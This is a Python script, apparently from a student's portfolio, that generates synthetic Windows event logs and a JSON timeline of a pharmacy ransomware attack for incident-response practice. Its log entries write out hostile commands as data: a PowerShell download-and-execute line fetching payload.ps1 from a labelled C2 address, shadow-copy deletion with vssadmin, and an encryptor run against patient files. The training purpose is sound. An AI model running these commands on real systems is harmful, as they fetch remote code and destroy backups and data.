#!/usr/bin/env python3
"""
generate_sample_logs.py
Generate synthetic Windows Event Log entries (XML) simulating a pharmacy ransomware attack.

Purpose:
    Creates realistic-but-fake event log data for portfolio demonstration and
    IR playbook testing. All data is clearly watermarked as synthetic. No real
    PHI, passwords, or patient information is used.

Output:
    - sample_logs.xml          : Synthetic Windows Event Log XML
    - sample_logs_timeline.json: Normalized JSON timeline for analysis

Author: Vincent Phan (Entry-level IT/Cybersecurity student)
License: MIT
"""

import xml.etree.ElementTree as ET
import json
import datetime
import random
import sys
from typing import List, Dict, Any


# ──────────────────────────────────────────────────────────────────────────────
# Configuration: Attack timeline (all times synthetic, PDT for consistency)
# ──────────────────────────────────────────────────────────────────────────────
BASE_DATE = datetime.datetime(2026, 5, 15, 18, 0, 0)  # 6:00 PM baseline
EVENTS = [
    # (offset_minutes, event_id, channel, level, provider, description, extra)
    (0, 4624, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Successful logon: PHARM-TECH\\jchen from workstation PHARM-WS-03. Logon type 2 (Interactive).",
     {"LogonType": "2", "IpAddress": "10.0.1.45", "TargetUserName": "jchen"}),

    (7, 1040, "Application", "Information", "MsiInstaller",
     "Installer began: Adobe Reader update (legitimate).",
     {}),

    (12, 1, "Windows PowerShell", "Information", "PowerShell",
     "Engine state changed from None to Available. Session started by user PHARM-TECH\\jchen.",
     {}),

    (12, 400, "Windows PowerShell", "Information", "PowerShell",
     "Remote host is started. Host application path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     {}),

    (13, 4103, "Windows PowerShell", "Warning", "PowerShell",
     "Command invoked: 'Invoke-Expression -Command (New-Object Net.WebClient).DownloadString(\"http://192.168.200.55/payload.ps1\")'",
     {"CommandLine": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://192.168.200.55/payload.ps1')"}),

    (15, 4624, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Successful logon: PHARM-TECH\\jchen from workstation PHARM-WS-03. Logon type 3 (Network).",
     {"LogonType": "3", "IpAddress": "10.0.1.45", "TargetUserName": "jchen"}),

    (22, 4624, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Successful logon: PHARM-TECH\\svc_backup from PHARM-DC-01. Logon type 3 (Network).",
     {"LogonType": "3", "IpAddress": "10.0.1.10", "TargetUserName": "svc_backup"}),

    (25, 4624, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Successful logon: PHARM-TECH\\admin from PHARM-DC-01. Logon type 3 (Network).",
     {"LogonType": "3", "IpAddress": "10.0.1.10", "TargetUserName": "admin"}),

    (27, 4648, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Attempted logon using explicit credentials: PHARM-TECH\\admin targeting PHARM-WS-DISP.",
     {"TargetServerName": "PHARM-WS-DISP", "IpAddress": "10.0.1.10"}),

    (32, 1, "System", "Information", "Service Control Manager",
     "Service start: WinDefend (Windows Defender Antivirus Service).",
     {}),

    (35, 5001, "Microsoft-Windows-Windows Defender/Operational", "Warning", "Microsoft-Windows-Windows Defender",
     "Antimalware protection disabled on PHARM-WS-DISP. Reason: User action.",
     {}),

    (38, 5001, "Microsoft-Windows-Windows Defender/Operational", "Warning", "Microsoft-Windows-Windows Defender",
     "Antimalware protection disabled on PHARM-DC-01. Reason: User action.",
     {}),

    (42, 1, "System", "Information", "Service Control Manager",
     "Service start: vss (Volume Shadow Copy).",
     {}),

    (47, 1, "System", "Information", "Service Control Manager",
     "Service stop: vss (Volume Shadow Copy).",
     {}),

    (48, 4688, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Process created: New process C:\\Windows\\System32\\vssadmin.exe with command line 'vssadmin delete shadows /all /quiet'.",
     {"CommandLine": "vssadmin delete shadows /all /quiet", "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe"}),

    (52, 4688, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Process created: New process C:\\Windows\\Temp\\encryptor.exe with command line 'encryptor.exe -target \\\\\\\\PHARM-DC\\Shared\\PatientData -ext .encrypted'.",
     {"CommandLine": "encryptor.exe -target \\\\\\\\PHARM-DC\\Shared\\PatientData -ext .encrypted", "NewProcessName": "C:\\Windows\\Temp\\encryptor.exe"}),

    (55, 4663, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Object access: File C:\\Shared\\PatientData\\Patient_001_demographics.txt was modified. User: PHARM-TECH\\admin.",
     {"ObjectName": "C:\\Shared\\PatientData\\Patient_001_demographics.txt", "AccessMask": "0x10000"}),

    (57, 4663, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Object access: File C:\\Shared\\PatientData\\Patient_002_prescription.json was modified. User: PHARM-TECH\\admin.",
     {"ObjectName": "C:\\Shared\\PatientData\\Patient_002_prescription.json", "AccessMask": "0x10000"}),

    (60, 4663, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Object access: File C:\\Shared\\PatientData\\Patient_003_insurance.xml was modified. User: PHARM-TECH\\admin.",
     {"ObjectName": "C:\\Shared\\PatientData\\Patient_003_insurance.xml", "AccessMask": "0x10000"}),

    (65, 4663, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Object access: File C:\\Shared\\PatientData\\Patient_004_billing.csv was modified. User: PHARM-TECH\\admin.",
     {"ObjectName": "C:\\Shared\\PatientData\\Patient_004_billing.csv", "AccessMask": "0x10000"}),

    (72, 4663, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Object access: File C:\\Shared\\PatientData\\Patient_005_medication_history.docx was modified. User: PHARM-TECH\\admin.",
     {"ObjectName": "C:\\Shared\\PatientData\\Patient_005_medication_history.docx", "AccessMask": "0x10000"}),

    (75, 1, "System", "Information", "Service Control Manager",
     "Service stop: IoT_TempSensor (Temperature monitoring service on VLAN 30).",
     {}),

    (76, 1, "System", "Information", "Service Control Manager",
     "Service stop: IoT_HumiditySensor (Humidity monitoring service on VLAN 30).",
     {}),

    (78, 1014, "System", "Warning", "Microsoft-Windows-DNS-Client",
     "DNS resolution failed: Name resolution for the name temp-sensor-01.pharm.local timed out after none of the configured DNS servers responded.",
     {"QueryName": "temp-sensor-01.pharm.local"}),

    (82, 4625, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Failed logon: Unknown user from IP 203.0.113.77 (external). Logon type 10 (RemoteInteractive).",
     {"LogonType": "10", "IpAddress": "203.0.113.77", "TargetUserName": "UNKNOWN"}),

    (85, 4625, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Failed logon: Unknown user from IP 203.0.113.77 (external). Logon type 10 (RemoteInteractive).",
     {"LogonType": "10", "IpAddress": "203.0.113.77", "TargetUserName": "UNKNOWN"}),

    (90, 4625, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Failed logon: PHARM-TECH\\admin from IP 203.0.113.77 (external). Logon type 10 (RemoteInteractive).",
     {"LogonType": "10", "IpAddress": "203.0.113.77", "TargetUserName": "admin"}),

    (95, 4624, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Successful logon: PHARM-TECH\\admin from IP 203.0.113.77 (external). Logon type 10 (RemoteInteractive).",
     {"LogonType": "10", "IpAddress": "203.0.113.77", "TargetUserName": "admin"}),

    (100, 4688, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Process created: New process C:\\Windows\\System32\\cmd.exe with command line 'cmd.exe /c echo YOUR FILES HAVE BEEN ENCRYPTED > C:\\Shared\\README_RECOVER.txt'.",
     {"CommandLine": "cmd.exe /c echo YOUR FILES HAVE BEEN ENCRYPTED > C:\\Shared\\README_RECOVER.txt", "NewProcessName": "C:\\Windows\\System32\\cmd.exe"}),

    (105, 4663, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Object access: File C:\\Shared\\PatientData\\README_RECOVER.txt was created. User: PHARM-TECH\\admin.",
     {"ObjectName": "C:\\Shared\\PatientData\\README_RECOVER.txt", "AccessMask": "0x10000"}),

    (110, 4656, "Security", "Information", "Microsoft-Windows-Security-Auditing",
     "Object access: Handle to C:\\Shared\\PatientData\\inventory_20260515.xlsx requested. User: PHARM-TECH\\admin.",
     {"ObjectName": "C:\\Shared\\PatientData\\inventory_20260515.xlsx", "AccessMask": "0x10000"}),
]

# IOCs for cross-referencing (used by check_iocs.py)
IOC_HASHES = {
    "encryptor.exe": "88e80df89cd71b7f6ca924d669977b292d906b229308730c727f4f1e04ee8dda",
    "payload.ps1": "29c59adddeea115bfe13599cc7322b44886ab27b69f4f14eb40b91894d4bbce5",
}

IOC_IPS = [
    "203.0.113.77",   # External RDP attacker (TEST-NET-3, non-routable)
    "192.168.200.55", # C2 payload server (RFC 1918)
]

IOC_DOMAINS = [
    "temp-sensor-01.pharm.local",  # Internal IoT DNS (legitimate, but disconnected)
]


# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────
def generate_event_id() -> str:
    """Generate a random synthetic event record ID."""
    return "".join(random.choices("0123456789abcdef", k=32))


def build_xml_event(event_data: Dict[str, Any]) -> ET.Element:
    """
    Build a single <Event> XML element matching the Windows Event Log schema.

    Args:
        event_data: Dictionary with keys for EventID, TimeCreated, Channel,
                    Level, Provider, EventRecordID, and Data fields.

    Returns:
        xml.etree.ElementTree.Element representing the event.
    """
    event = ET.Element("Event")
    event.set("xmlns", "http://schemas.microsoft.com/win/2004/08/events/event")

    system = ET.SubElement(event, "System")
    ET.SubElement(system, "Provider", Name=event_data["Provider"])
    ET.SubElement(system, "EventID", text=str(event_data["EventID"]))
    ET.SubElement(system, "Version", text="0")
    ET.SubElement(system, "Level", text=str(event_data["Level"]))
    ET.SubElement(system, "Task", text="0")
    ET.SubElement(system, "Opcode", text="0")
    ET.SubElement(system, "Keywords", text="0x8020000000000000")
    ET.SubElement(system, "TimeCreated", SystemTime=event_data["TimeCreated"])
    ET.SubElement(system, "EventRecordID", text=event_data["EventRecordID"])
    ET.SubElement(system, "Correlation")
    ET.SubElement(system, "Execution", ProcessID=str(random.randint(1000, 9999)),
                   ThreadID=str(random.randint(1000, 9999)))
    ET.SubElement(system, "Channel", text=event_data["Channel"])
    ET.SubElement(system, "Computer", text=event_data.get("Computer", "PHARM-DC-01"))
    ET.SubElement(system, "Security", UserID=event_data.get("SecurityUserID", "S-1-5-18"))

    event_data_elem = ET.SubElement(event, "EventData")
    for key, value in event_data.get("Data", {}).items():
        ET.SubElement(event_data_elem, "Data", Name=key, text=str(value))

    # Rendered message as a comment-like Data element (non-standard but useful for readability)
    if "Message" in event_data:
        ET.SubElement(event_data_elem, "Data", Name="Message", text=event_data["Message"])

    return event


def generate_events() -> List[Dict[str, Any]]:
    """
    Generate the full synthetic event list with normalized timestamps and metadata.

    Returns:
        List of event dictionaries ready for XML and JSON serialization.
    """
    events = []
    for offset, eid, channel, level, provider, description, extra in EVENTS:
        timestamp = BASE_DATE + datetime.timedelta(minutes=offset)
        iso_ts = timestamp.strftime("%Y-%m-%dT%H:%M:%S.%fZ")

        level_map = {"Information": "4", "Warning": "3", "Error": "2", "Critical": "1"}
        level_code = level_map.get(level, "4")

        record = {
            "EventID": eid,
            "TimeCreated": iso_ts,
            "Channel": channel,
            "Level": level_code,
            "Provider": provider,
            "EventRecordID": generate_event_id(),
            "Computer": "PHARM-DC-01" if "DC" in description or "DC-01" in str(extra) else "PHARM-WS-03",
            "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
            "Message": f"[SYNTHETIC] {description}",
            "Data": {**extra, "_Synthetic": "true", "_Watermark": "PORTFOLIO-SAMPLE-2026"},
        }
        events.append(record)
    return events


def write_xml(events: List[Dict[str, Any]], path: str) -> None:
    """
    Write events to a Windows-style Event Log XML file.

    Args:
        events: List of event dictionaries.
        path: Output file path.
    """
    root = ET.Element("Events")
    root.set("xmlns", "http://schemas.microsoft.com/win/2004/08/events/event")

    # Add a prominent synthetic-data comment
    comment = ET.Comment(" SYNTHETIC DATA - DO NOT USE FOR REAL INVESTIGATION ")
    root.append(comment)

    watermark = ET.Comment(
        " Generated by generate_sample_logs.py "
        "| Portfolio: Ransomware IR Playbook "
        "| Author: Vincent Phan (CPhT, Student) "
        "| All patient names, IPs, and hashes are fabricated. "
    )
    root.append(watermark)

    for event_data in events:
        event_elem = build_xml_event(event_data)
        root.append(event_elem)

    tree = ET.ElementTree(root)
    ET.indent(tree, space="  ")
    tree.write(path, encoding="utf-8", xml_declaration=True)
    print(f"[+] Wrote XML event log: {path}")


def write_json(events: List[Dict[str, Any]], path: str) -> None:
    """
    Write a normalized JSON timeline for programmatic analysis.

    Args:
        events: List of event dictionaries.
        path: Output file path.
    """
    timeline = {
        "metadata": {
            "source": "generate_sample_logs.py",
            "generated_at": datetime.datetime.now().isoformat(),
            "watermark": "SYNTHETIC-PORTFOLIO-DATA-2026",
            "disclaimer": "ALL DATA IS FABRICATED. No real PHI, names, or credentials.",
            "author": "Vincent Phan (CPhT, CSUSB-bound IT/Cybersecurity student)",
            "scenario": "Pharmacy ransomware attack: phishing -> lateral movement -> encryption -> IoT disconnect",
            "system": "PHARM-DC-01 (Domain Controller), PHARM-WS-03 (Pharmacy workstation), PHARM-WS-DISP (Dispensary)",
            "vlan_mapping": {
                "VLAN_10": "Corporate / Pharmacy workstations",
                "VLAN_20": "Servers / Domain Controller",
                "VLAN_30": "IoT / Temperature sensors",
                "VLAN_99": "Evidence preservation (isolated)"
            }
        },
        "events": events,
        "iocs": {
            "file_hashes": IOC_HASHES,
            "ip_addresses": IOC_IPS,
            "domains": IOC_DOMAINS,
            "file_extensions": [".encrypted", ".locked", ".README_RECOVER.txt"],
            "mitre_techniques": [
                {"id": "T1566.001", "name": "Phishing: Spearphishing Attachment"},
                {"id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"},
                {"id": "T1071", "name": "Application Layer Protocol"},
                {"id": "T1078", "name": "Valid Accounts"},
                {"id": "T1021.001", "name": "Remote Services: RDP"},
                {"id": "T1490", "name": "Inhibit System Recovery"},
                {"id": "T1486", "name": "Data Encrypted for Impact"},
                {"id": "T1496", "name": "Resource Hijacking"},
            ]
        }
    }

    with open(path, "w", encoding="utf-8") as f:
        json.dump(timeline, f, indent=2, ensure_ascii=False)
    print(f"[+] Wrote JSON timeline: {path}")


# ──────────────────────────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────────────────────────
def main() -> int:
    """
    Generate synthetic pharmacy ransomware event logs.

    Returns:
        0 on success, 1 on error.
    """
    try:
        print("=" * 60)
        print("SYNTHETIC EVENT LOG GENERATOR")
        print("Portfolio: Ransomware IR Playbook (Healthcare/Pharmacy)")
        print("=" * 60)

        events = generate_events()
        print(f"[*] Generated {len(events)} synthetic events.")

        xml_path = "sample_logs.xml"
        json_path = "sample_logs_timeline.json"

        write_xml(events, xml_path)
        write_json(events, json_path)

        print("\n" + "=" * 60)
        print("SCENARIO SUMMARY:")
        print("-" * 60)
        print("18:00  - Normal interactive logon by pharmacy tech (jchen)")
        print("18:12  - PowerShell remote session starts")
        print("18:13  - Suspicious Invoke-Expression (C2 payload download)")
        print("18:47  - Lateral movement to dispensary workstation")
        print("19:12  - Volume shadow copy deletion (vssadmin)")
        print(r"19:30  - Encryption begins on \PHARM-DC\Shared\PatientData")
        print("19:45  - IoT temperature sensors disconnect (VLAN 30)")
        print("20:30  - External RDP login from 203.0.113.77")
        print("20:35  - Ransom note (README_RECOVER.txt) created")
        print("=" * 60)
        print("\n[!] All data is synthetic. No real patient information.")
        print(f"    Files written: {xml_path}, {json_path}")
        return 0

    except Exception as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        return 1


# ──────────────────────────────────────────────────────────────────────────────
# Unit-test style assertions (embedded as comments for verification)
# ──────────────────────────────────────────────────────────────────────────────
# Run: python3 -c "import generate_sample_logs; e = generate_sample_logs.generate_events(); assert len(e) == len(generate_sample_logs.EVENTS); print('PASS: event count matches')"
# Run: python3 -c "import generate_sample_logs; e = generate_sample_logs.generate_events(); assert e[0]['EventID'] == 4624; print('PASS: first event is logon')"
# Run: python3 -c "import generate_sample_logs; e = generate_sample_logs.generate_events(); assert any(x['EventID'] == 4688 and 'vssadmin' in str(x.get('Data',{})) for x in e); print('PASS: vssadmin event found')"
# Run: python3 -c "import generate_sample_logs; e = generate_sample_logs.generate_events(); assert any(x['EventID'] == 4688 and 'encryptor' in str(x.get('Data',{})) for x in e); print('PASS: encryptor event found')"
# Run: python3 -c "import generate_sample_logs; e = generate_sample_logs.generate_events(); assert all('_Synthetic' in str(x.get('Data',{})) for x in e); print('PASS: all events watermarked')"

if __name__ == "__main__":
    sys.exit(main())
